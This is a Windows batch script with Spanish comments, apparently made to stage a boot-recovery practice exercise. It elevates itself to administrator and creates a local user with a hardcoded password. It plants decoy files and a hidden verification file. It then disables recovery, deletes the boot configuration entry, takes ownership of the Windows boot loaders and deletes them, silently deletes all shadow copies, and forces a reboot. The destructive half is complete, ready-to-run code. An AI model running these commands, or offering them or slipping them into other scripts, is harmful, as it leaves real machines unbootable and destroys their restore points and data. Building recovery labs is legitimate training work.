@echo off
title Preparando entorno de practica - NO CERRAR

:: --- 1. AUTO-ELEVACION A ADMINISTRADOR ---
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Solicitando permisos de administrador...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo [1/4] Creando usuario Empleado1 y estructura de carpetas...

:: Crear usuario local Empleado1 (contrasena: Alumno2026!)
net user Empleado1 Alumno2026! /add >nul 2>&1

:: Crear estructura de directorios del perfil sin necesidad de iniciar sesion con el
set "USER_DIR=%SystemDrive%\Users\Empleado1"
mkdir "%USER_DIR%\Desktop" >nul 2>&1
mkdir "%USER_DIR%\Documents\Contabilidad" >nul 2>&1
mkdir "%USER_DIR%\Pictures" >nul 2>&1

echo [2/4] Generando archivos y token de verificacion oculto...

:: Generar un codigo unico (Hash SHA256) basado en el equipo y la hora actual
for /f "usebackq tokens=*" %%H in (`powershell -NoProfile -Command "[BitConverter]::ToString((New-Object Security.Cryptography.SHA256Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + (Get-Date -Format 'yyyyMMddHHmmssfff')))).Replace('-','').Substring(0,16)"`) do set "TOKEN_UNICO=%%H"

:: Crear archivos visibles de trabajo en su perfil
echo Informe anual de facturacion - Confidencial > "%USER_DIR%\Documents\Contabilidad\Balance_2026.txt"
echo Recordatorio: Revisar copias de seguridad antes del viernes. > "%USER_DIR%\Desktop\Notas_Reunion.txt"

:: Crear archivo testigo OCULTO y de SISTEMA con el hash de verificacion
set "ARCHIVO_TESTIGO=%USER_DIR%\Documents\Contabilidad\.verificacion_sys.dat"
(
    echo === REGISTRO DE VERIFICACION DE RECUPERACION ===
    echo Equipo original: %COMPUTERNAME%
    echo Fecha de creacion: %DATE% %TIME%
    echo Hash de control: %TOKEN_UNICO%
) > "%ARCHIVO_TESTIGO%"

:: Aplicar atributos Oculto (+h) y Sistema (+s) al archivo testigo
attrib +h +s "%ARCHIVO_TESTIGO%" >nul 2>&1

echo [3/4] Provocando fallo critico en el arranque...

:: Desactivar reparacion automatica y eliminar entrada del BCD
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /delete {current} /f >nul 2>&1

:: Eliminar cargadores de arranque (UEFI y Legacy) usando SID universal
takeown /f "%SystemRoot%\System32\winload.efi" /a >nul 2>&1
icacls "%SystemRoot%\System32\winload.efi" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\System32\winload.efi" >nul 2>&1

takeown /f "%SystemRoot%\System32\winload.exe" /a >nul 2>&1
icacls "%SystemRoot%\System32\winload.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\System32\winload.exe" >nul 2>&1

:: Borrar puntos de restauracion
vssadmin delete shadows /all /quiet >nul 2>&1

echo [4/4] Escenario completado. Reiniciando en 5 segundos...
shutdown /r /f /t 5
